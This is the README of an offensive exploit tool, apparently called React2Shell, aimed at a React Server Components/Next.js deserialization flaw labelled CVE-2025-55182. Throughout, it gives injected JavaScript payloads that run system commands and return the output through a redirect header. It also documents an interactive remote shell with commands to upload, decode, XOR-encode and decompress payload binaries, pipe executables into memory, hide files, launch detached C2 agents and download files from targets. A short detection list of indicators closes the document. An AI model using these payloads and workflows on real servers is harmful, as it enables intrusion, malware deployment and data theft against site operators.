# CVE-2025-55182 — React2Shell Exploit Tool

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application  
**CVSS:** 10.0 (CRITICAL) · CWE-502 Deserialization of Untrusted Data · No auth required

---

## Vulnerability

React Server Components Flight protocol deserializes multipart POST bodies without validation. Attacker injects a fake `Chunk` object containing a custom `then` handler; React's internal resolver triggers it, executing arbitrary JavaScript inside the server Node.js process.

### Affected Versions

| Component | Vulnerable | Patched |
| --------- | ---------- | ------- |
| React | 19.0.0 – 19.2.0 | ≥ 19.3.0 |
| Next.js | 15.0.0–15.0.4, 15.1.0–15.1.8, 15.2.0–15.2.5, 16.0.0–16.0.6 | ≥ 15.0.5 / 15.1.9 / 15.2.6 / 16.0.7 |

---

## Repository Structure

```
react2shell-tool/
├── exploit.py              # Single-shot command execution (no interactive shell)
├── run_exploit.py          # Interactive shell launcher  ← use this
├── encode_payload.py       # Encode local binary → base64 (no line breaks)
├── decode_payload.py       # Decode base64 → binary locally
├── compress_payload.py     # Compress + base64 encode (T1027.015)
├── encrypt_payload_xor.py  # Position-dependent XOR encode/decode for CertCA.bin (T1027.013)
└── exploit_tool/
    ├── main.py             # Arg parsing, creates InteractiveShell
    ├── shell.py            # InteractiveShell — command loop & dispatch
    ├── engine.py           # ExploitEngine — HTTP requests, response parsing
    ├── payload_generator.py# PayloadGenerator — builds exploit payloads
    ├── config.py           # ExploitConfig — target URL, timeout
    ├── theme.py            # Terminal colors
    ├── utils.py            # to_charcode() helper
    └── commands/
        ├── builtin.py      # info, help, history, timeout, eval, run
        └── file_ops.py     # upload, stage, decode, decompress, copyfile, rename, download, pipestage, pipeload
```

**Request/Response flow:**
```
shell.py  →  engine.execute()  →  PayloadGenerator.build_exploit_payload()
          →  POST /  [Next-Action: x]
          ←  X-Action-Redirect: /login?a=<base64>
          →  base64.b64decode → print output
```

---

## Quick Start

```bash
# Interactive shell
python run_exploit.py -t http://target.com
python run_exploit.py -t http://target.com -T 30   # custom timeout

# Single-shot
python exploit.py -t http://target.com -c "whoami"
```

---

## Exploit Payload Structure

Every command sends a `multipart/form-data` POST with `Next-Action: x`:

```
Field 0 (name="0"):  Malicious JSON — injects JS into _response._prefix
Field 1 (name="1"):  "$@0"          — references Field 0 (triggers deserialization)
Field 2 (name="2"):  []
```

The injected `_prefix` string is executed server-side. Output is always exfiltrated via:
```javascript
var b64 = Buffer.from(output).toString('base64');
throw Object.assign(new Error('NEXT_REDIRECT'), {
    digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`
});
// → response header: X-Action-Redirect: /login?a=<b64>;307;
```

---

## Execution Modes

### Mode 1 — `execSync` (default, any unrecognized command)

Triggered by: typing any system command directly.  
Spawns `cmd.exe` (Windows) / shell (Linux). Blocks until command completes.

```bash
rce > whoami
rce > dir C:\ProgramData
rce > powershell -c "Get-LocalUser"
```

**Injected `_prefix` (from `payload_generator.py`):**
```javascript
var res = process.mainModule.require('child_process').execSync('<COMMAND>').toString();
var b64 = Buffer.from(res).toString('base64');;
throw Object.assign(new Error('NEXT_REDIRECT'), {digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`});
```

> ⚠️ `sanitize_command()` pre-processes the command: `\` → `\\\\`, `"` → `\"`, `'` → `\'`, newlines stripped.

---

### Mode 2 — `eval` (no child process)

Triggered by: `eval <js>` command, or internally by all file operations.  
Executes JavaScript in-process inside Node.js. No child process spawned.  
Uses `String.fromCharCode` encoding to avoid quote conflicts in JSON.

```bash
rce > eval process.cwd()
rce > eval process.mainModule.require('os').hostname()

# Detached spawn for long-running processes (doesn't block web request)
rce > eval process.mainModule.require('child_process').spawn('C:/Windows/Temp/payload.exe',[],{detached:true,stdio:'ignore'}).unref()
```

> ⚠️ `require` alone is **not** in scope inside eval — always use `process.mainModule.require(...)`.  
> ⚠️ Use `/` or `\\\\` for Windows paths in JS strings inside eval.

**Injected `_prefix` (from `payload_generator.py`):**
```javascript
var res = eval('<COMMAND_AS_STRING.fromCharCode>');
var b64 = Buffer.from(String(res)).toString('base64');;
throw Object.assign(new Error('NEXT_REDIRECT'), {digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`});
```

The actual command `<js_code>` is converted to `String.fromCharCode(...)` by `to_charcode()` before injection, then wrapped: `eval(String.fromCharCode(<codes>))`.

---

### Mode 3 — `spawnSync` (`run` command only)

Triggered by: `run <exe> [args...]`.  
Spawns process directly — no `cmd.exe`. Blocks until process exits.

```bash
rce > run C:\ProgramData\CertEnrollAgent.exe
rce > run C:\Windows\Temp\CertEnrollSvc.exe C:\ProgramData\CertEnrollAgent.exe
```

> ⚠️ Blocks the HTTP request until process exits. For long-running processes (C2 agents), use `eval` + `spawn({detached:true, stdio:'ignore'}).unref()` instead.

**Injected `_prefix` (from `payload_generator.py`):**
```javascript
var cp = process.mainModule.require('child_process');
var res = cp.spawnSync('<exe>', ['<arg1>', '<arg2>'], {shell: false, encoding: 'utf8'});
var output = (res.stdout ? res.stdout.toString() : '') + (res.stderr ? res.stderr.toString() : '');
var b64 = Buffer.from(output).toString('base64');;
throw Object.assign(new Error('NEXT_REDIRECT'), {digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`});
```

---

## Commands Reference

### File Operations (`file_ops.py`)

| Command | Signature | Description | Spawns Process? |
| ------- | --------- | ----------- | --------------- |
| `stage` | `stage [--encrypt] <local.exe> <remote.bin>` | **Preferred** — Reads raw binary locally, optionally XOR-encodes (`--encrypt`, T1027.013), base64-encodes in Python memory, streams chunks into `global.__stageBuffer` on target, flushes to `<remote.bin>`. No `.b64` on target disk. | ❌ No — eval only |
| `upload` | `upload <local.b64> [remote_dest]` | Reads local b64 file, uploads in **2000-char chunks** via `fs.writeFileSync` / `fs.appendFileSync`. `remote_dest` defaults to `out.b64` | ❌ No — eval only |
| `decode` | `decode <in.b64> <out.file>` | `fs.writeFileSync(out, Buffer.from(fs.readFileSync(in,'utf8').trim(),'base64'))` on target | ❌ No — eval only |
| `decompress` | `decompress <in.gz> <out.file>` | **T1027.015** — `fs.writeFileSync(out, zlib.gunzipSync(fs.readFileSync(in)))` — built-in `zlib`, no spawn | ❌ No — eval only |
| `copyfile` | `copyfile <src> <dst>` | `fs.copyFileSync(src, dst)` on target | ❌ No — eval only |
| `rename` | `rename <old> <new>` | `fs.renameSync(old, new)` on target | ❌ No — eval only |
| `download` | `download <remote_path>` | Binary-safe chunked download: `fs.statSync` → `fs.readSync` 8192 bytes/chunk → saves as `downloaded_<filename>` | ❌ No — eval only |
| `hide` | `hide <filepath>` | **T1564.001** — `spawnSync('attrib', ['+h', filepath])` — spawns `attrib.exe` | ✅ **Yes** — `attrib.exe` |
| `pipestage` | `pipestage <local.exe> <target_exe> [ghost_cmdline]` | **T1620** — Stream local PE to target memory → pipe stdin to `<target_exe>`. Zero disk artifact for the piped PE. `ghost_cmdline` forwarded as argv[1] if specified. | ✅ **Yes** — `target_exe` |
| `pipeload` | `pipeload <payload.b64> <target_exe> [ghost_cmdline]` | **T1620** — Reads b64 file on target, decodes to Buffer, spawns `<target_exe>` with payload bytes via stdin pipe. | ✅ **Yes** — `target_exe` |

**Notes:**
- All eval-only commands wrap JS code in `eval(String.fromCharCode(...))` to avoid quote issues
- `hide`, `pipestage`, `pipeload` spawn processes — intentional for Calibrated detection (T1564.001, T1620)
- `stage --encrypt` XOR formula: `out[i] = in[i] ^ ((0xA3 + i * 0x5B) & 0xFF)` — matches `ENABLE_PAYLOAD_XOR` in `CWLImplant.cpp`

### Built-in Commands (`builtin.py`, `shell.py`)

| Command | Signature | Description |
| ------- | --------- | ----------- |
| `eval` | `eval <js_code>` | Execute JS via eval mode (no spawn). Prints `(no output)` if result is empty |
| `run` | `run <exe> [args...]` | Execute via spawnSync (no cmd.exe). Args space-separated |
| `info` | `info` | Runs `ver`/`uname -a`, `whoami`, `hostname`, `cd`/`pwd` via execSync |
| `timeout` | `timeout [sec]` | Show or set HTTP request timeout |
| `history` | `history` | Print command history list |
| `help` | `help` | Print command reference |
| `clear` | `clear` | Clear screen + reprint banner |
| `exit`/`quit` | — | Exit shell |

---

## File Transfer Workflow

### Stage binary to target (preferred — 1 step, no .b64 on target disk)

```bash
# Reads raw binary locally, encodes in Python memory, streams into global.__stageBuffer,
# flushes to .bin — eliminates encode_payload.py + upload + decode + rename (4 steps → 1)
rce > stage payload.exe C:\Windows\Temp\payload.bin

# Execute (use .bin extension — Windows CreateProcessW accepts any extension with full path)
rce > run C:\Windows\Temp\payload.bin
rce > eval process.mainModule.require('child_process').spawn('C:/Windows/Temp/payload.bin',[],{detached:true,stdio:'ignore'}).unref()
```

### Upload binary to target (standard — when .b64 needed on target)

```powershell
# 1. Encode locally (PowerShell — no line breaks)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("payload.exe")) | Out-File payload.b64 -NoNewline

# Or using encode_payload.py
python encode_payload.py payload.exe -o payload.b64
```

```bash
# 2. Upload (auto-split into 2000-char chunks)
rce > upload payload.b64              # → writes to out.b64 on target
rce > upload payload.b64 custom.b64  # → writes to custom.b64 on target

# 3. Decode on target
rce > decode out.b64 payload.exe

# 4. Execute (use run for short-lived, eval+spawn for C2 agents)
rce > run payload.exe
rce > eval process.mainModule.require('child_process').spawn('C:/path/payload.exe',[],{detached:true,stdio:'ignore'}).unref()
```

### Upload compressed binary (T1027.015 — Compression)

```bash
# 1. Compress + encode locally (single line for upload efficiency)
python compress_payload.py payload.exe -o payload.gz.b64 --b64 -l 0

# Output example:
# [+] Compression successful!
# [*] Original size: 524288 bytes
# [*] Compressed size: 198456 bytes
# [*] Compression ratio: 62.2%
# [*] Base64 size: 264608 bytes
# [*] Output file: payload.gz.b64 (264608 bytes)
# [*] Format: single line (no wrapping)
```

```bash
# 2. Upload compressed payload
rce > upload payload.gz.b64 C:\Windows\Temp\svc.gz.b64

# 3. Decompress on target (T1027.015 — zlib.gunzipSync, NO spawn)
rce > decompress C:\Windows\Temp\svc.gz.b64 C:\ProgramData\svchost.exe

# 4. Execute
rce > run C:\ProgramData\svchost.exe
```

**Benefits:**
- **62%+ size reduction** — faster upload, less network traffic
- **Defense Evasion** — T1027.015 Compression obfuscation
- **No spawn** — `zlib` is built-in Node.js module, pure eval execution
- **Detection observable** — `node.exe` reads `.gz.b64`, decompresses via `zlib`, writes `.exe`

### Download file from target

```bash
rce > download C:\Windows\System32\drivers\etc\hosts
# → saved locally as: downloaded_hosts
```

`download` implementation detail:
1. `fs.statSync(path).size` — get file size
2. `(new Function(...))()` — access-check (`fs.openSync` / `fs.closeSync`)
3. Loop: `fs.readSync(fd, buf, 0, 8192, offset)` → `buf.toString('base64')` per chunk
4. Python side: `base64.b64decode(chunk)` → append to local file as binary

### Copy / Rename on target

```bash
rce > copyfile C:\ProgramData\CertCA2.bin C:\ProgramData\CertCA.bin
rce > rename C:\ProgramData\CertCA2.bin CertCA.bin
```

---

## Technical Internals

### String.fromCharCode Technique (`utils.py`)

`sanitize_command()` escapes single/double quotes, which breaks nested JSON strings. File ops and `eval` bypass this by converting the entire JS payload to character codes:

```python
def to_charcode(s: str) -> str:
    return ','.join(str(ord(c)) for c in s)

# 'fs'     → "102,115"
# 'out.b64' → "111,117,116,46,98,54,52"
```

Result injected into `_prefix`:
```javascript
eval(String.fromCharCode(112,114,111,99,101,115,115,...))
// → zero quoted strings inside the JSON body
```

### Chunked Upload Detail

```python
chunk_size = 2000  # chars of base64 text
chunks = [b64[i:i+2000] for i in range(0, len(b64), 2000)]

# chunk 0
js = f"process.mainModule.require('fs').writeFileSync('{dest}','{chunk}')"
# chunk N
js = f"process.mainModule.require('fs').appendFileSync('{dest}','{chunk}')"

# each js string → to_charcode() → eval(String.fromCharCode(...))
```

### Response Parsing (`engine.py`)

```python
redirect_header = response.headers.get('X-Action-Redirect', '')
match = re.search(r'/login\?a=([^;]*)', redirect_header)
decoded = base64.b64decode(unquote(match.group(1))).decode('utf-8', errors='replace')
```

HTTP 500 → `('server_error')`. File ops (write/copy/rename) treat `server_error` as success — those Node.js calls return `undefined`, causing the redirect throw to fail, which triggers a 500.

---

## Module API Reference

### `ExploitConfig` (`config.py`)

| Attribute / Method | Default | Description |
| ------------------ | ------- | ----------- |
| `target_url` | `"http://localhost:3000"` | Target URL |
| `timeout` | `15` | HTTP request timeout (seconds) |
| `normalize_url(url)` | — | Prepends `http://` if scheme missing |

### `InteractiveShell` (`shell.py`)

| Method | Description |
| ------ | ----------- |
| `__init__(target_url)` | Creates `ExploitConfig`, `ExploitEngine`, `FileOperations`, `BuiltinCommands` |
| `show_banner()` | Prints CVE banner + target URL |
| `get_prompt()` | Returns prompt string `rce @ <host> #<n> >` |
| `execute_command(command)` | execSync mode — calls `engine.execute(command)` |
| `execute_command_spawn(command)` | spawnSync mode — calls `engine.execute(command, use_spawn=True)` |
| `run()` | Main REPL loop: reads input → dispatches to handler |

### `ExploitEngine` (`engine.py`)

| Method | Signature | Returns |
| ------ | --------- | ------- |
| `__init__(config)` | — | Sets `self.session`, `self.command_count = 0` |
| `craft_headers(boundary)` | `craft_headers(boundary)` | Dict with `Next-Action`, `X-Nextjs-Request-Id`, `Content-Type`, `User-Agent` |
| `execute` | `execute(command, silent=False, use_eval=False, use_spawn=False)` | `(success: bool, status: str, output: str)` |
| `parse_response` | `parse_response(response, silent=False)` | `(success, status, output)` — parses `X-Action-Redirect` header |

### `PayloadGenerator` (`payload_generator.py`)

All methods are `@staticmethod`.

| Method | Signature | Returns / Notes |
| ------ | --------- | --------------- |
| `generate_hash` | `generate_hash(length=8)` | SHA-256 of `time.time()`, first `length` hex chars |
| `sanitize_command` | `sanitize_command(cmd)` | `\` → `\\\\\\\\`, `"` → `\"`, `'` → `\'`, strips `\n` |
| `parse_command_for_spawn` | `parse_command_for_spawn(command)` | `(executable: str, args: list[str])` |
| `build_exploit_payload` | `build_exploit_payload(command, use_eval=False, use_spawn=False)` | `(body: str, boundary: str)` for multipart POST |

### `FileOperations` (`commands/file_ops.py`)

| Method | Signature | Description |
| ------ | --------- | ----------- |
| `stage` | `stage(args: str)` | Parses `[--encrypt] <local_binary> <remote.bin>`. Reads raw binary; if `--encrypt`, applies position-dependent XOR (`0xA3`, `0x5B`) before b64 encode (T1027.013). Streams 2000-char chunks into `global.__stageBuffer`, writes to dest. Cleanup: `delete global.__stageBuffer` |
| `upload` | `upload(args: str)` | Parses `<local.b64> [remote_dest]`. Default dest `out.b64`. Sends in 2000-char chunks via `writeFileSync`/`appendFileSync` |
| `decode` | `decode(args: str)` | Parses `<in.b64> <out.file>`. Runs `fs.writeFileSync(out, Buffer.from(fs.readFileSync(in,'utf8').trim(),'base64'))` on target |
| `decompress` | `decompress(args: str)` | **T1027.015** — Parses `<in.gz> <out.file>`. Runs `fs.writeFileSync(out, zlib.gunzipSync(fs.readFileSync(in)))` on target — built-in `zlib`, no spawn |
| `copy` | `copy(args: str)` | Parses `<src> <dst>`. Runs `fs.copyFileSync(src, dst)` on target |
| `rename` | `rename(args: str)` | Parses `<old> <new>`. Runs `fs.renameSync(old, new)` on target |
| `download` | `download(remote_path: str)` | stat → access check via `new Function(...)()` → loop `fs.readSync` (8192 bytes/chunk) → saves as `downloaded_<filename>` |
| `hide` | `hide(filepath: str)` | **T1564.001** — Sets Windows hidden attribute via `attrib.exe +h` (spawns `attrib.exe`) |
| `pipestage` | `pipestage(args: str)` | **T1620** — Parses `<local.exe> <target_exe> [ghost_cmdline]`. Streams PE into `global.__stageBuffer`, decodes in-memory, prepends 4-byte LE size header, `spawnSync(target_exe, [ghost_cmdline], {input: stdinData})`. Zero disk artifact for piped PE. |
| `pipeload` | `pipeload(args: str)` | **T1620** — Parses `<b64_file> <target_exe> [ghost_cmdline]`. Reads b64 file on target, decodes to Buffer, prepends 4-byte LE size header, `spawnSync(target_exe, [ghost_cmdline], {input: stdinData})`. |

### `BuiltinCommands` (`commands/builtin.py`)

| Method | Signature | Description |
| ------ | --------- | ----------- |
| `show_help()` | — | Prints formatted help text |
| `show_info()` | — | Queries `ver`/`uname -a`, `whoami`, `hostname`, `cd`/`pwd` via execSync |
| `set_timeout` | `set_timeout(args: str)` | No args → print current; with int arg → update `config.timeout` |
| `eval_js` | `eval_js(args: str)` | Converts args via `to_charcode()` → executes via eval mode |
| `show_history()` | — | Prints `shell.command_history` list |

### `utils.py`

```python
def to_charcode(s):
    """Convert string to String.fromCharCode format"""
    return ','.join(str(ord(c)) for c in s)
```

### `main.py` — CLI args

| Flag | Default | Description |
| ---- | ------- | ----------- |
| `-t / --target` | *(required)* | Target URL or bare domain |
| `-T / --timeout` | `15` | Request timeout in seconds |

---

## IOCs / Detection

- `POST /` with `Next-Action: x` header
- Multipart body with `"then":"$1:__proto__:then"` or `"$@0"` field reference
- `X-Action-Redirect: /login?a=<base64>` in response headers
- `node.exe` → `cmd.exe` or unexpected child process spawns
- High-entropy `eval(String.fromCharCode(...))` patterns in server-side request logs
- **T1027.015 Compression**: `node.exe` reads `.gz` file, `zlib.gunzipSync` API call, writes `.exe`/`.dll` to disk
- File creation pattern: `.b64` → `.gz` → `.exe` (upload → decompress → execute chain)
- Chunked file writes via `fs.appendFileSync` (2000-char chunks for upload)
- `attrib.exe` spawned by `node.exe` with `+h` flag (T1564.001 - Hide Artifacts)
- **T1027.013 XOR Encode** (`stage --encrypt`): `node.exe` writes `.bin` file where first byte = `0xEE` (not `MZ`); on-disk bytes differ from in-memory PE
- **T1620 `pipestage`**: `node.exe` accumulates PE in `global.__stageBuffer` then calls `spawnSync(target_exe, {input: [4-byte-size][PE-bytes]})` — no PE file written to disk at any point
- **T1620 `pipeload`**: `node.exe` reads `.b64` from target disk, decodes, `spawnSync` with PE bytes as stdin — `.b64` file is the only disk artifact
